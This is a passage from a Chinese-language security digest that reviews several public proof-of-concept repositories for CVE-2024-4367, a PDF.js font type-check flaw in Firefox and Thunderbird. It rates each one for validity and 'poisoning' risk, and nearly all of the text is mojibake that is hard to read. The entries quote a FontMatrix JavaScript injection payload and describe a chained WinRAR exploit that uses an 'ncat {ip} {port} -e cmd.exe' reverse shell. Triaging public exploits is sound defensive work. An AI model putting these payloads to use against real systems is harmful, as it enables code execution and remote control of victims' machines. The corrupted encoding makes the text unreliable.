æä¾›çš„ POC ä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªè‡ªå®šä¹‰å­—ä½“ï¼ˆå¯¹è±¡ 5 0 objï¼‰ï¼Œè¯¥å­—ä½“çš„ `FontMatrix` å±æ€§åŒ…å« JavaScript ä»£ç ï¼š`/FontMatrix [0.1 0 0 0.1 0 (1\); alert\('document.location'\)]`ã€‚å½“å‘ˆç°æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå¦‚æœ PDF.js æ²¡æœ‰æ­£ç¡®æ‰§è¡Œç±»å‹æ£€æŸ¥ï¼Œå°±ä¼šæ‰§è¡Œ `alert('document.location')`ã€‚

**æŠ•æ¯’é£é™©ï¼š**

ç»è¿‡åˆ†æï¼Œæä¾›çš„POCä»£ç ä¸­**æ²¡æœ‰**å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`alert('document.location')` ä»…ä»…æ˜¯ä¸€ä¸ªå¼¹çª—ï¼Œç”¨äºéªŒè¯XSSæ˜¯å¦æ‰§è¡Œ. 

æŠ•æ¯’é£é™©è¯„ä¼°ï¼š0%

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **åˆ›å»ºæ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…ä¼šåˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒJavaScript ä»£ç åµŒå…¥åœ¨å­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­ã€‚
2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±å¯¼ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefoxã€Firefox ESR æˆ– Thunderbird æ‰“å¼€è¿™ä¸ªæ¶æ„ PDF æ–‡ä»¶ã€‚è¿™å¯ä»¥é€šè¿‡ç½‘ç»œé’“é±¼æ”»å‡»ã€æ¶æ„ç½‘ç«™æˆ–å°† PDF æ–‡ä»¶åµŒå…¥åˆ°ç”µå­é‚®ä»¶ä¸­æ¥å®ç°ã€‚
3.  **JavaScript ä»£ç æ‰§è¡Œï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šå°è¯•è§£æå’Œå‘ˆç° PDF å†…å®¹ã€‚ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­çš„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚å¦‚æœæˆåŠŸ `alert('document.location')` ä¼šè§¦å‘ã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å¯¼è‡´ä»¥ä¸‹åæœï¼š
    *   **è·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼š** æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œçªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ Cookieã€ä¼šè¯ä»¤ç‰Œï¼‰ã€ç¯¡æ”¹ç½‘é¡µå†…å®¹æˆ–é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€‚
    *   **ä¿¡æ¯æ³„éœ²ï¼š** æ”»å‡»è€…å¯ä»¥è®¿é—®ç”¨æˆ·çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿæˆ–ç½‘ç»œèµ„æºï¼Œä»è€Œæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   **å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼š** å°† Firefoxã€Firefox ESR å’Œ Thunderbird å‡çº§åˆ°å·²ä¿®å¤æ­¤æ¼æ´çš„ç‰ˆæœ¬ (>= Firefox 126, >= Firefox ESR 115.11, >= Thunderbird 115.11)ã€‚
*   **è°¨æ…æ‰“å¼€ PDF æ–‡ä»¶ï¼š** é¿å…æ‰“å¼€æ¥è‡ªä¸å¯ä¿¡æ¥æºçš„ PDF æ–‡ä»¶ã€‚
*   **é…ç½® PDF.jsï¼š** å¦‚æœä¸éœ€è¦ JavaScript æ”¯æŒï¼Œå¯ä»¥ç¦ç”¨ PDF.js çš„ JavaScript æ‰§è¡ŒåŠŸèƒ½ (å°† `isEvalSupported` è®¾ç½®ä¸º `false`)ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ PDF æ–‡ä»¶å¹¶è¯±å¯¼ç”¨æˆ·æ‰“å¼€æ¥æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è™½ç„¶CVSSè¯„åˆ†ä¸é«˜ï¼Œä½†ç”±äºfirefox,thunderbirdç”¨æˆ·çš„å¹¿æ³›æ€§ï¼Œå…¶é€ æˆçš„å±å®³ä¸å¯å¿½è§†

**é¡¹ç›®åœ°å€:** [MihranGIT/POC_CVE-2024-4367](https://github.com/MihranGIT/POC_CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #8

**æ¥æº**: [CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md](../2024/CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md)

## CVE-2024-4367-Firefox-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œä¿¡æ¯æ³„éœ²ã€‚

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefoxã€Firefox ESRå’ŒThunderbirdä¸­PDF.jsç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ã€‚è¯¥æ¼æ´æºäºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œä¸€ä¸ªç‰¹åˆ¶çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶ä¸­æä¾›äº†åˆ©ç”¨æ­¥éª¤ï¼š
1.  ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„ `poc.pdf` æ–‡ä»¶ã€‚
2.  ä½¿ç”¨ `firefox.py` è„šæœ¬å¯åŠ¨æ˜“å—æ”»å‡»ç‰ˆæœ¬çš„Firefox (ä¾‹å¦‚ 125ç‰ˆ)ï¼Œå¹¶è‡ªåŠ¨æ‰“å¼€ `poc.pdf`ã€‚
3.  éªŒè¯æ˜¯å¦æ‰§è¡Œäº†JavaScriptä»£ç ï¼Œæ˜¯å¦å¼¹å‡ºäº†alertçª—å£ã€‚

`firefox.py` è„šæœ¬å¯ä»¥ä¸‹è½½å¹¶å¯åŠ¨æŒ‡å®šç‰ˆæœ¬çš„Firefox Nightlyç‰ˆæœ¬ï¼Œè¿™æ–¹ä¾¿äº†æ¼æ´çš„éªŒè¯ã€‚è„šæœ¬è¿˜åŒ…å«äº†ä¸‹è½½ç‰¹å®šç‰ˆæœ¬Firefoxçš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

å¯¹æä¾›çš„POCä»£ç è¿›è¡Œäº†åˆ†æï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚é£é™©ä¸»è¦æ¥è‡ªäºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **`firefox.py`è„šæœ¬:**
    *   è¯¥è„šæœ¬ä¼šä»Mozillaçš„å®˜æ–¹FTPæœåŠ¡å™¨ä¸‹è½½Firefox Nightlyç‰ˆæœ¬ã€‚è™½ç„¶è¿™æ˜¯å®˜æ–¹æ¥æºï¼Œä½†æ”»å‡»è€…å¯èƒ½åœ¨æœªæ¥ç¯¡æ”¹è¿™äº›FTPæœåŠ¡å™¨ï¼ˆè™½ç„¶å¯èƒ½æ€§æä½ï¼‰ã€‚æˆ–è€…ï¼Œåœ¨ä¸‹è½½è¿‡ç¨‹ä¸­å‘ç”Ÿä¸­é—´äººæ”»å‡»ï¼Œä»è€Œä¸‹è½½è¢«ç¯¡æ”¹çš„Firefoxç‰ˆæœ¬ã€‚
    *   è¯¥è„šæœ¬åŒ…å« `subprocess.run` å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œä¸‹è½½çš„Firefoxã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è„šæœ¬æ‰§è¡Œçš„å‚æ•°ï¼Œå¯èƒ½ä¼šæ³¨å…¥é¢å¤–çš„å‚æ•°ï¼Œå¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
    *   å°½ç®¡è„šæœ¬çš„ç›®çš„ä¼¼ä¹æ˜¯ä¸ºäº†æ–¹ä¾¿åœ°ä¸‹è½½å’Œå¯åŠ¨ç‰¹å®šç‰ˆæœ¬çš„Firefoxï¼Œä½†ç”¨æˆ·ä»ç„¶éœ€è¦ä»”ç»†æ£€æŸ¥è„šæœ¬çš„å†…å®¹ï¼Œç¡®ä¿ä¸‹è½½é“¾æ¥å’Œæ‰§è¡Œè¿‡ç¨‹æ˜¯å®‰å…¨çš„ã€‚
2.  **`CVE-2024-4367.py`è„šæœ¬ (æœªæä¾›å…·ä½“ä»£ç ):**
    *   è™½ç„¶`README.md`æŒ‡å‘ä¸€ä¸ªå¤–éƒ¨githubåº“ï¼Œä½†å¦‚æœæ­¤åº“è¢«ç¯¡æ”¹ï¼Œæ‰§è¡Œè„šæœ¬`CVE-2024-4367.py`ç”Ÿæˆçš„`poc.pdf`æ–‡ä»¶æœ‰å¯èƒ½åµŒå…¥æ›´æ¶æ„çš„Payload.
3.  **å…è´£å£°æ˜:**
    *   `README.md` ä¸­åŒ…å«å…è´£å£°æ˜ï¼Œè¿™è¡¨æ˜ä½œè€…æ„è¯†åˆ°æ½œåœ¨çš„é£é™©ï¼Œå¹¶è¯•å›¾æ’‡æ¸…è´£ä»»ã€‚ä½†è¿™å¹¶ä¸èƒ½å®Œå…¨æ¶ˆé™¤é£é™©ï¼Œç”¨æˆ·ä»ç„¶éœ€è¦è‡ªè¡Œæ‰¿æ‹…ä½¿ç”¨POCä»£ç çš„åæœã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥ä»“åº“çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ¼”ç¤ºæ¼æ´åˆ©ç”¨ï¼Œè€Œä¸æ˜¯ä¸ºäº†è¿›è¡Œæ¶æ„æ”»å‡»ã€‚ä½†æ˜¯ï¼Œç”¨æˆ·åœ¨ä½¿ç”¨è¿™äº›ä»£ç æ—¶ä»ç„¶éœ€è¦ä¿æŒè­¦æƒ•ï¼Œä»”ç»†å®¡æŸ¥ä»£ç å†…å®¹ï¼Œç¡®ä¿äº†è§£æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´è§¦å‘:** æ”»å‡»è€…éœ€è¦åˆ¶ä½œåŒ…å«ç‰¹å®šæ ¼å¼çš„æ¶æ„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±ã€‚
2.  **JavaScriptæ‰§è¡Œ:** å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šå°è¯•è§£ææ¶æ„å­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´ä»»æ„JavaScriptä»£ç åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  **æ”»å‡»ç›®æ ‡:** æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç æ¥çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ cookiesï¼‰ã€æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€æˆ–è€…è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ã€‚

**æ€»ç»“ï¼š**
è¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”±äºFirefoxé»˜è®¤ä½¿ç”¨PDF.jsæ‰“å¼€PDFæ–‡ä»¶ï¼Œå› æ­¤è¯¥æ¼æ´å…·æœ‰è¾ƒé«˜çš„å½±å“èŒƒå›´ã€‚æä¾›çš„POCä»£ç å¯ä»¥å¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜éªŒè¯å’Œç†è§£è¯¥æ¼æ´ï¼Œä½†ä¹Ÿéœ€è¦æ³¨æ„æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [PenguinCabinet/CVE-2024-4367-hands-on](https://github.com/PenguinCabinet/CVE-2024-4367-hands-on)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #9

**æ¥æº**: [CVE-2024-4367-Scivous_CVE-2024-4367-npm.md](../2024/CVE-2024-4367-Scivous_CVE-2024-4367-npm.md)

## CVE-2024-4367-PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ¼æ´æºäºPDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨è¯¥æ¼æ´åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ¼æ´å½±å“Firefox, Firefox ESR, Thunderbirdã€‚ æ ¹æ®æœç´¢ç»“æœï¼ŒGitHubä¸Šå­˜åœ¨åˆ©ç”¨æ­¤æ¼æ´çš„POCä»£ç ã€‚ æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md)æ¯”è¾ƒç®€å•ï¼Œä»…ä»…æè¿°äº†CVE-2024-4367çš„å¤ç°ï¼Œä»è¯¥æ–‡ä»¶æ¥çœ‹ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ã€‚ä½†è€ƒè™‘åˆ°å®é™…çš„æ¼æ´åˆ©ç”¨ä»£ç å¯èƒ½åœ¨å…¶ä»–æ–‡ä»¶ä¸­ï¼Œéœ€è¦è¿›ä¸€æ­¥åˆ†ææ‰èƒ½ç¡®å®šæ˜¯å¦å­˜åœ¨æŠ•æ¯’è¡Œä¸ºã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„PDFæ–‡ä»¶è§¦å‘å­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼Œä»è€Œæ‰§è¡Œæ¶æ„JavaScriptä»£ç ã€‚CVSSè¯„åˆ†æ ¹æ®NVDçš„å˜æ›´è®°å½•ï¼Œä»åŸæ¥çš„CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:Lä¿®æ”¹ä¸ºäº†NIST AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H, è¿™è¡¨æ˜åˆ©ç”¨æ¡ä»¶å˜çš„å®¹æ˜“ï¼Œå±å®³æ€§æ›´é«˜äº†ã€‚å¦å¤–ï¼Œæœ‰è®¨è®ºè¡¨æ˜115.19.0esrä»ç„¶å—æ­¤æ¼æ´å½±å“ï¼Œéœ€è¦è¿›ä¸€æ­¥éªŒè¯ã€‚

**é¡¹ç›®åœ°å€:** [Scivous/CVE-2024-4367-npm](https://github.com/Scivous/CVE-2024-4367-npm)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #10

**æ¥æº**: [CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md](../2024/CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md)

## CVE-2024-4367 & CVE-2023-38831 PDFernet Remotelo

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** PDF.js å­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ & WinRARå‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird, WinRAR

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11, WinRAR <= 6.22

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿéœ€å®‰è£…å—å½±å“ç‰ˆæœ¬çš„Firefox/Thunderbirdå’ŒWinRARï¼Œä¸”ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

è¯¥POCåˆ©ç”¨äº†CVE-2024-4367 (PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ) å’Œ CVE-2023-38831 (WinRARå‘½ä»¤æ‰§è¡Œ) ä¸¤ä¸ªæ¼æ´ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼:**
1.  **CVE-2024-4367:**  é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡PDF.jsçš„ç±»å‹æ£€æŸ¥ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
2.  **CVE-2023-38831:**  åˆ©ç”¨WinRARå¤„ç†å‹ç¼©åŒ…æ—¶çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æ¶æ„raræ–‡ä»¶ä¸­åŒ…å«pdfå’Œbatè„šæœ¬,å½“ç”¨æˆ·å°è¯•æ‰“å¼€è¿™ä¸ªPDFæ–‡æ¡£æ—¶ï¼Œä¼šè§¦å‘WinRARæ¼æ´ï¼Œæ‰§è¡Œæ†ç»‘çš„BATè„šæœ¬ã€‚
3.  **POCä»£ç æµç¨‹:**
    *   ä¸»è„šæœ¬`PDFernetRemotelo.py`æç¤ºç”¨æˆ·è¾“å…¥æ”»å‡»è€…IPå’Œç«¯å£ã€‚
    *   åˆ›å»ºè¯±é¥µPDFæ–‡ä»¶ï¼ˆ`ResumendeSueldo.pdf`ï¼‰å’Œä¸€ä¸ªåŒ…å«åå‘shellå‘½ä»¤çš„BATè„šæœ¬ï¼ˆ`script.bat`ï¼‰ï¼Œè„šæœ¬å†…å®¹ä¸º`ncat {ip} {port} -e cmd.exe`ã€‚
    *   ä½¿ç”¨`PDFernet.py`è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„`poc.pdf`æ–‡ä»¶ï¼Œè¯¥JavaScriptä»£ç ç”±ç”¨æˆ·æä¾›çš„payloadç”Ÿæˆï¼Œæ­¤payloadä¼šè¢«åµŒå…¥åˆ°PDFçš„å­—ä½“ä¿¡æ¯ä¸­.
    *   `Remotelo.py`è„šæœ¬åˆ›å»ºä¸€ä¸ªRARå‹ç¼©åŒ…ï¼ˆ`PDFernetRemotelo.rar`ï¼‰ï¼Œå…¶ä¸­åŒ…å«è¯±é¥µPDFæ–‡ä»¶å’ŒBATè„šæœ¬ã€‚
    *   ç”¨æˆ·æ‰“å¼€`PDFernetRemotelo.rar`ä¸­çš„`ResumendeSueldo.pdf`ï¼Œè§¦å‘CVE-2024-4367ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
    *   æ¶æ„JavaScriptä»£ç å¯èƒ½è§¦å‘CVE-2023-38831ï¼Œæ‰§è¡ŒRARå‹ç¼©åŒ…ä¸­çš„`script.bat`ï¼Œå»ºç«‹ä¸æ”»å‡»è€…æœºå™¨çš„åå‘shellã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥POCåœ¨å—å½±å“çš„ç‰ˆæœ¬ä¸­æ˜¯æœ‰æ•ˆçš„ã€‚GitHubä¸Šå·²ç»æœ‰è¯¥æ¼æ´çš„æ­¦å™¨åŒ–åˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**
è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ä»£ç çš„PDFå’ŒRARæ–‡ä»¶ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯åˆ©ç”¨å·²çŸ¥çš„æ¼æ´ã€‚`PDFernetRemotelo.py` ä½¿ç”¨äº†å¤–éƒ¨è„šæœ¬ `PDFernet.py`å’Œ `Remotelo.py`ï¼Œå®¡æŸ¥è¿™äº›è„šæœ¬ï¼Œå‘ç°`PDFernet.py`ä¸­çš„payloadç”Ÿæˆé€»è¾‘æ˜¯å¯æ§çš„ï¼Œç›´æ¥æ¥è‡ªäºç”¨æˆ·æä¾›çš„å‚æ•°ã€‚`Remotelo.py`è„šæœ¬åˆ›å»ºRARå‹ç¼©åŒ…çš„è¿‡ç¨‹æ¯”è¾ƒæ ‡å‡†ã€‚æŠ•æ¯’é£é™©åœ¨äºï¼š
1.  **ä¾èµ–å¤–éƒ¨è„šæœ¬:** `PDFernetRemotelo.py` è°ƒç”¨äº†`PDFernet.py` å’Œ `Remotelo.py` è„šæœ¬,å­˜åœ¨æ¶æ„ä¿®æ”¹æ­¤è„šæœ¬çš„å¯èƒ½æ€§.
2.   **PayloadåµŒå…¥æ–¹å¼:** æ¶æ„ä»£ç åµŒå…¥åœ¨PDFå­—ä½“ä¿¡æ¯ä¸­ï¼Œå¦‚æœå¯¹PDFæ ¼å¼ä¸ç†Ÿæ‚‰ï¼Œå¾ˆéš¾ç›´æ¥çœ‹å‡ºæ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚å®¡æŸ¥æ—¶éœ€è°¨æ…ã€‚
3.   **éšè”½æ€§:** åˆ©ç”¨RARå‹ç¼©åŒ…å°†PDFå’ŒBATè„šæœ¬æ†ç»‘åœ¨ä¸€èµ·ï¼Œå¢åŠ äº†æ”»å‡»çš„éšè”½æ€§ã€‚

ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’ç‚¹åœ¨äºï¼š
1.  åœ¨`PDFernet.py`ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„JavaScriptä»£ç ï¼Œæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚ä¸‹è½½æ¶æ„æ–‡ä»¶æˆ–çªƒå–ç”¨æˆ·æ•°æ®ã€‚
2.  åœ¨ç”Ÿæˆçš„RARå‹ç¼©åŒ…ä¸­ï¼Œå¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„æ–‡ä»¶ï¼Œä¾‹å¦‚æ¶æ„DLLæ–‡ä»¶æˆ–åé—¨ç¨‹åºã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œè™½ç„¶æ ¸å¿ƒä»£ç çœ‹èµ·æ¥æ¯”è¾ƒç›´æ¥ï¼Œä½†è€ƒè™‘åˆ°ä¾èµ–å¤–éƒ¨è„šæœ¬ä»¥åŠpayloadåµŒå…¥æ–¹å¼çš„éšè”½æ€§ï¼Œä»ç„¶å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚ä¿å®ˆä¼°è®¡æŠ•æ¯’é£é™©ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [UnHackerEnCapital/PDFernetRemotelo](https://github.com/UnHackerEnCapital/PDFernetRemotelo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #11

**æ¥æº**: [CVE-2024-4367-VVeakee_CVE-2024-4367.md](../2024/CVE-2024-4367-VVeakee_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„JavaScriptä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
